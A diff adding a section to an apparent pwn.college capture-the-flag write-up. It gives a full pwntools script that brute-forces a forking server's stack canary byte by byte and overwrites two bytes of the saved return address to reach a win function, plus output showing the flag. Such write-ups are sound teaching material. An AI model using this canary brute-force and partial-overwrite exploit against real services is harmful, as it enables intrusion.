@@ -9837,7 +9837,110 @@ I first tried with the above script, until I realized that the parent process is
 So the sending the offset multiple times and hoping that the 4th least significant nibble of the actual address corresponds with the one I am sending won't be the best solution.
 For that we have to close the binary listener, start it again, and send our payloads again.
 
-The approach I settled on was to brute force the 4th least significant nibble actively.
+There are two approaches to solve this problem.
+
+#### Running the challenge from inside the exploit, and reruning it until the PIE offset matches
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import struct
+import time
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# --- INITIALIZED VALUES ---
+BINARY_PATH = '/challenge/fork-foolery-hard'
+buffer_addr = 0x7ffd8aa00320
+canary_addr = 0x7ffd8aa00348
+addr_of_saved_ip = 0x7ffd8aa00358
+safe_win_authed_offset = 0x2045 
+
+# --- CALCULATED CONSTANTS ---
+offset_to_canary = canary_addr - buffer_addr # 40 bytes
+offset_to_ret = addr_of_saved_ip - (canary_addr + 8) # 8 bytes (saved RBP)
+
+attempt = 0
+while True:
+    attempt += 1
+    # 1. Start a fresh instance of the binary to randomize ASLR/Canary
+    server = process(BINARY_PATH)
+    time.sleep(0.5) # Allow time for socket binding
+    
+    print(f"[*] Attempt {attempt} | Target: {hex(safe_win_authed_offset)}")
+    
+    # 2. Stage 1: Leak Canary for this specific process instance
+    known_canary = b'\x00'
+    for i in range(7):
+        for byte_guess in range(256):
+            try:
+                p = remote('127.0.0.1', 1337)
+                p.recvuntil(b"Payload size: ")
+                
+                current_guess = known_canary + p8(byte_guess)
+                payload_size = offset_to_canary + len(current_guess)
+                
+                p.sendline(str(payload_size).encode())
+                p.send(b"A" * offset_to_canary + current_guess)
+                
+                output = p.recvall(timeout=0.2)
+                if b"Goodbye!" in output and b"stack smashing" not in output:
+                    known_canary += p8(byte_guess)
+                    p.close()
+                    break
+                p.close()
+            except:
+                pass
+    
+    print(f"[+] Found Canary: {hex(u64(known_canary))}")
+
+    # 3. Stage 2: Attempt RIP Overwrite
+    try:
+        p = remote('127.0.0.1', 1337)
+        p.recvuntil(b"Payload size: ")
+        
+        # Calculate size: 40 (pad) + 8 (canary) + 8 (rbp) + 2 (RIP overwrite) = 58
+        payload_size = offset_to_canary + 8 + offset_to_ret + 2
+        p.sendline(str(payload_size).encode())
+        p.recvuntil(b"bytes)!")
+        
+        payload = b"A" * offset_to_canary
+        payload += known_canary
+        payload += b"B" * offset_to_ret
+        payload += struct.pack("<H", safe_win_authed_offset)
+        
+        p.send(payload)
+        output = p.recvrepeat(1.0).decode(errors='ignore')
+        
+        if "pwn.college{" in output:
+            print(f"\n[!] SUCCESS ON ATTEMPT {attempt}!")
+            print(output)
+            server.terminate()
+            break 
+            
+        print("[-] Offset mismatch. Restarting binary...")
+        p.close()
+    except:
+        pass
+    
+    # Clean up the process before restarting
+    server.terminate()
+    server.wait()
+```
+
+```
+hacker@program-security~fork-foolery-hard:/$ python ~/script.py 
+[*] Attempt 1 | Target: 0x2045
+[+] Found Canary: 0xd0d7a04d00b94300
+
+[!] SUCCESS ON ATTEMPT 1!
+
+Goodbye!
+You win! Here is your flag:
+pwn.college{w6VFD6ynO9FNrkx1MGQ3P_3vFyz.0FOxMDL4ITM0EzW}
+```
+
+#### Running the challenge separately, and actively brute-forcing the 4th least significant nibble of the PIE offset
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
